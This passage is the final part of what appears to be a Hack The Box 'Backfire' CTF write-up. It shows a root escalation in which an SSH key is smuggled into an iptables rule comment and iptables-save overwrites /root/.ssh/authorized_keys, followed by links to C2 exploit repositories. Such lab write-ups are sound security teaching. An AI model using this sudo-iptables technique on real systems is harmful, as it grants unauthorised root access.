</span></span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=nx>sergej</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>$</span> <span class=nx>sudo</span> <span class=nx>iptables</span> <span class=o>-</span><span class=nx>A</span> <span class=nx>INPUT</span> <span class=o>-</span><span class=nx>i</span> <span class=nx>lo</span> <span class=o>-</span><span class=nx>j</span> <span class=nx>ACCEPT</span> <span class=o>-</span><span class=nx>m</span> <span class=nx>comment</span> <span class=o>--</span><span class=nx>comment</span> <span class=err>$&#39;\</span><span class=nx>nssh</span><span class=o>-</span><span class=nx>ed25519</span> <span class=nx>AA</span><span class=o>...</span><span class=nx>Dk</span> <span class=nx>kali</span><span class=err>@</span><span class=nx>kali</span><span class=err>\</span><span class=nx>n</span><span class=err>&#39;</span>
</span></span><span class="line hl"><span class=cl><span class=nx>sergej</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>$</span> <span class=nx>sudo</span> <span class=nx>iptables</span> <span class=o>-</span><span class=nx>S</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>P</span> <span class=nx>INPUT</span> <span class=nx>ACCEPT</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>P</span> <span class=nx>FORWARD</span> <span class=nx>ACCEPT</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>P</span> <span class=nx>OUTPUT</span> <span class=nx>ACCEPT</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>A</span> <span class=nx>INPUT</span> <span class=o>-</span><span class=nx>s</span> <span class=mf>127.0.0.1</span><span class=o>/</span><span class=mi>32</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>tcp</span> <span class=o>-</span><span class=nx>m</span> <span class=nx>tcp</span> <span class=o>--</span><span class=nx>dport</span> <span class=mi>5000</span> <span class=o>-</span><span class=nx>j</span> <span class=nx>ACCEPT</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>A</span> <span class=nx>INPUT</span> <span class=o>-</span><span class=nx>s</span> <span class=mf>127.0.0.1</span><span class=o>/</span><span class=mi>32</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>tcp</span> <span class=o>-</span><span class=nx>m</span> <span class=nx>tcp</span> <span class=o>--</span><span class=nx>dport</span> <span class=mi>5000</span> <span class=o>-</span><span class=nx>j</span> <span class=nx>ACCEPT</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>A</span> <span class=nx>INPUT</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>tcp</span> <span class=o>-</span><span class=nx>m</span> <span class=nx>tcp</span> <span class=o>--</span><span class=nx>dport</span> <span class=mi>5000</span> <span class=o>-</span><span class=nx>j</span> <span class=nx>REJECT</span> <span class=o>--</span><span class=nx>reject</span><span class=o>-</span><span class=nx>with</span> <span class=nx>icmp</span><span class=o>-</span><span class=nx>port</span><span class=o>-</span><span class=nx>unreachable</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>A</span> <span class=nx>INPUT</span> <span class=o>-</span><span class=nx>s</span> <span class=mf>127.0.0.1</span><span class=o>/</span><span class=mi>32</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>tcp</span> <span class=o>-</span><span class=nx>m</span> <span class=nx>tcp</span> <span class=o>--</span><span class=nx>dport</span> <span class=mi>7096</span> <span class=o>-</span><span class=nx>j</span> <span class=nx>ACCEPT</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>A</span> <span class=nx>INPUT</span> <span class=o>-</span><span class=nx>s</span> <span class=mf>127.0.0.1</span><span class=o>/</span><span class=mi>32</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>tcp</span> <span class=o>-</span><span class=nx>m</span> <span class=nx>tcp</span> <span class=o>--</span><span class=nx>dport</span> <span class=mi>7096</span> <span class=o>-</span><span class=nx>j</span> <span class=nx>ACCEPT</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>A</span> <span class=nx>INPUT</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>tcp</span> <span class=o>-</span><span class=nx>m</span> <span class=nx>tcp</span> <span class=o>--</span><span class=nx>dport</span> <span class=mi>7096</span> <span class=o>-</span><span class=nx>j</span> <span class=nx>REJECT</span> <span class=o>--</span><span class=nx>reject</span><span class=o>-</span><span class=nx>with</span> <span class=nx>icmp</span><span class=o>-</span><span class=nx>port</span><span class=o>-</span><span class=nx>unreachable</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>A</span> <span class=nx>INPUT</span> <span class=o>-</span><span class=nx>i</span> <span class=nx>lo</span> <span class=o>-</span><span class=nx>m</span> <span class=nx>comment</span> <span class=o>--</span><span class=nx>comment</span> <span class=s>&#34;
</span></span></span><span class=line><span class=cl><span class=s>ssh-ed25519 AA...Dk kali@kali
</span></span></span><span class=line><span class=cl><span class=s>&#34;</span> <span class=o>-</span><span class=nx>j</span> <span class=nx>ACCEPT</span>
</span></span><span class="line hl"><span class=cl><span class=nx>sergej</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>$</span> <span class=nx>sudo</span> <span class=nx>iptables</span><span class=o>-</span><span class=nx>save</span> <span class=o>-</span><span class=nx>f</span> <span class=o>/</span><span class=nx>root</span><span class=o>/</span><span class=p>.</span><span class=nx>ssh</span><span class=o>/</span><span class=nx>authorized_keys</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt>1
</span></span><span class=hl><span class=lnt>2
</span></span><span class=lnt>3
</span><span class=hl><span class=lnt>4
</span></span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=err>$</span> <span class=nx>ssh</span> <span class=o>-</span><span class=nx>i</span> <span class=p>~</span><span class=o>/</span><span class=p>.</span><span class=nx>ssh</span><span class=o>/</span><span class=nx>id_ed25519</span> <span class=nx>root</span><span class=err>@</span><span class=mf>10.10.11.49</span>          
</span></span><span class="line hl"><span class=cl><span class=nx>root</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>#</span> <span class=nx>ls</span>
</span></span><span class=line><span class=cl><span class=nx>root</span><span class=p>.</span><span class=nx>txt</span>
</span></span><span class="line hl"><span class=cl><span class=nx>root</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>#</span> <span class=nx>cat</span> <span class=nx>root</span><span class=p>.</span><span class=nx>txt</span>
</span></span><span class=line><span class=cl><span class=nx>a7b</span><span class=p>[</span><span class=o>...</span><span class=p>]</span><span class=mi>74</span><span class=nx>e</span></span></span></code></pre></td></tr></table></div></div><h2 id=resources>Resources</h2><blockquote><p><a class=link href=https://github.com/HavocFramework/Havoc target=_blank rel=noopener>GitHub Repo for the Havoc C2 Framework</a><br><a class=link href=https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE target=_blank rel=noopener>GitHub Repo for the Havoc C2 SSRF + RCE Exploit</a><br><a class=link href=https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7 target=_blank rel=noopener>Medium Article for the HardHat C2 Exploit</a><br><a class=link href=https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/ target=_blank rel=noopener>Article Explaining How to Exploit iptables and iptables-save via a sudo Misconfiguration</a></p></blockquote></section><footer class=article-footer><section class=article-tags><a href=/tags/ssrf/>SSRF</a>
<a href=/tags/rce/>RCE</a>
<a href=/tags/c2/>C2</a>
<a href=/tags/sudo-misconfiguration/>Sudo Misconfiguration</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<span>Last updated on Jun 07, 2025 00:00 UTC</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/dog-htb-writeup-linux-easy/><div class=article-image><img src=/p/dog-htb-writeup-linux-easy/Dog.194e4f071d31e687f4febb8864f4e7bb_hu_bb6fcf3e65a4f114.PNG width=250 height=150 loading=lazy alt="Featured image of post Dog - Linux Easy - HTB Writeup" data-key=Dog-htb-writeup-linux-easy data-hash="md5-GU5PBx0x5of0/ruIZPTnuw=="></div><div class=article-details><h2 class=article-title>Dog - Linux Easy - HTB Writeup</h2></div></a></article><article class=has-image><a href=/p/titanic-htb-writeup-linux-easy/><div class=article-image><img src=/p/titanic-htb-writeup-linux-easy/Titanic.9a98f753eaa2598331c4a3b6645bb30e_hu_2fdd37a5c6d25f5f.PNG width=250 height=150 loading=lazy alt="Featured image of post Titanic - Linux Easy - HTB Writeup" data-key=titanic-htb-writeup-linux-easy data-hash="md5-mpj3U+qiWYMxxKO2ZFuzDg=="></div><div class=article-details><h2 class=article-title>Titanic - Linux Easy - HTB Writeup</h2></div></a></article><article class=has-image><a href=/p/underpass-htb-writeup-linux-easy/><div class=article-image><img src=/p/underpass-htb-writeup-linux-easy/UnderPass.44bb7ee9e58e8bbb0a9b64e2d848d833_hu_964a19e723a3fa55.PNG width=250 height=150 loading=lazy alt="Featured image of post UnderPass - Linux Easy - HTB Writeup" data-key=underpass-htb-writeup-linux-easy data-hash="md5-RLt+6eWOi7sKm2Ti2EjYMw=="></div><div class=article-details><h2 class=article-title>UnderPass - Linux Easy - HTB Writeup</h2></div></a></article><article class=has-image><a href=/p/administrator-htb-writeup-windows-medium/><div class=article-image><img src=/p/administrator-htb-writeup-windows-medium/Administrator.db86c5f4c4d7c69f40f948144960674f_hu_884d8f24a9a731fa.PNG width=250 height=150 loading=lazy alt="Featured image of post Administrator - Windows Medium - HTB Writeup" data-key=administrator-htb-writeup-windows-medium data-hash="md5-24bF9MTXxp9A+UgUSWBnTw=="></div><div class=article-details><h2 class=article-title>Administrator - Windows Medium - HTB Writeup</h2></div></a></article><article class=has-image><a href=/p/linkvortex-htb-writeup-linux-easy/><div class=article-image><img src=/p/linkvortex-htb-writeup-linux-easy/LinkVortex.e0c8b262f6f9a4b5a0332301be74b3aa_hu_c3bc27ff9a2a6e7d.PNG width=250 height=150 loading=lazy alt="Featured image of post LinkVortex - Linux Easy - HTB Writeup" data-key=linkvortex-htb-writeup-linux-easy data-hash="md5-4MiyYvb5pLWgMyMBvnSzqg=="></div><div class=article-details><h2 class=article-title>LinkVortex - Linux Easy - HTB Writeup</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2025 01MI</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>